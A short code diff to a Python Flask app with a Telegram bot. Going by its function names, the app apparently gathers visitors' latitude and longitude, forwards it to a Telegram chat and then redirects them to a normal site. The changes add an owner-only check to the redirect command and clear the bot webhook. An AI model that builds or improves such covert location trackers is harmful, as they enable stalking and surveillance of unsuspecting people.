@@ -13,7 +13,6 @@ CORS(app)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Редирект по умолчанию и переменная для хранения текущего редиректа
 redirect_url = 'https://yandex.ru'
 
 def send_to_telegram(lat, lon):
@@ -70,6 +69,9 @@ def send_location():
 @bot.message_handler(commands=['setredirect'])
 def cmd_setredirect(message):
     global redirect_url
+    if message.chat.id != CHAT_ID:
+        bot.reply_to(message, "❌ Доступ запрещен.")
+        return
     args = message.text.split(maxsplit=1)
     if len(args) == 2:
         url = args[1].strip()
@@ -82,6 +84,7 @@ def cmd_setredirect(message):
         bot.reply_to(message, "Использование:\n/setredirect https://example.com")
 
 def run_bot():
+    bot.remove_webhook()  # Важно! Убираем webhook перед polling
     bot.infinity_polling()
 
 if __name__ == '__main__':
